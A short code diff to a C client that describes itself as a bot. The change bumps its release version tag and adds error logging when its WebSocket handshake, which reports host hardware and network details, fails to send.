@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.16"
+#define BOT_VERSION_TAG "v4.0.17"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -213,7 +213,8 @@ int main(int argc, char *argv[])
                  g_bot_uuid, esc_hwid, esc_ip, esc_os, info.cpu_cores, info.ram_mb,
                  info.net_mbps, BOT_VERSION_TAG);
         if (foreground) fprintf(stderr, "[bot] WS connected, handshake sent\n");
-        ws_send(&ws, hs);
+        int wr = ws_send(&ws, hs);
+        if (foreground && wr <= 0) fprintf(stderr, "[bot] handshake send FAIL wr=%d\n", wr);
 
         time_t last_hb = time(NULL);
         time_t last_recv = time(NULL);
